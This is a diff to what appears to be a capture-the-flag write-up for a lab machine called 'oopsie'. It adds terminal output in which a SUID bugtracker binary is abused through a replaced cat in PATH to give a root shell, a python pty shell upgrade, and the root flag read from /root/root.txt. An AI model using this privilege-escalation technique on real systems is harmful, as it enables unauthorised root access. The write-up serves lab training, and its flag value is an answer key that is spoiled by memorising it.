@@ -659,6 +659,23 @@ echo $PATH
 
 Now executing the bugtracker binary gives us shell access:
 
+```
+robert@oopsie:/tmp$ bugtracker
+bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 10
+10
+---------------
+
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@oopsie:/tmp# 
+```
+
 ### Root FLAG
 
 We can find the root user flag in /root/root.txt using the bugtracker binary without privilege escalation:
@@ -678,5 +695,11 @@ af13b0bee69f8a877c3faf667f7beacf
 Aborted (core dumped)
 ```
 
+To extract root.txt in the PE mode we need to run cat from /bin/cat as we have replaced the original in PATH:
 
+```
+root@oopsie:/tmp# /bin/cat /root/root.txt
+/bin/cat /root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
+```
 
